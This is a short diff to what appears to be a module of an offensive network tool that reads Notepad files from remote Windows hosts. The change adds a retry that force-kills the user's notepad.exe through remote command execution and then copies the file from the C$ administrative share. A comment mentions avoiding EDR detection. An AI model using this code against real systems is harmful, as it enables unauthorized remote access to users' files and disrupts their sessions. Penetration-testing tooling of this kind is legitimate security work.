@@ -96,14 +96,13 @@ class NXCModule:
         except Exception as e:
             if "STATUS_SHARING_VIOLATION" in str(e):  # It means notepad.exe is open on target.
                 if self.kill:
-                    # If there's a sharing violation, try alternative approach
-                    context.log.debug(f"Sharing violation on {file_path}, trying alternative method")
                     try:
                         context.log.debug(f"Trying to kill notepad.exe process for {user} user.")
                         # To Do: Kill process with RPC, connection.execute can be detect by EDRs and module wont work. Or copy the target bin files without trigger the EDRs
                         connection.execute("taskkill /IM notepad.exe /F")  # If notepad.exe open by user, needs to kill that process for reading files.
                         time.sleep(1)  # Sleep 1 sec for finding and reading processing
                         context.log.debug(f"Notepad process was successfully killed for {user}")
+                        connection.conn.getFile("C$", file_path, buf.write)
                     except Exception as e:
                         context.log.debug(f"Alternative method failed: {e}")
                 else:
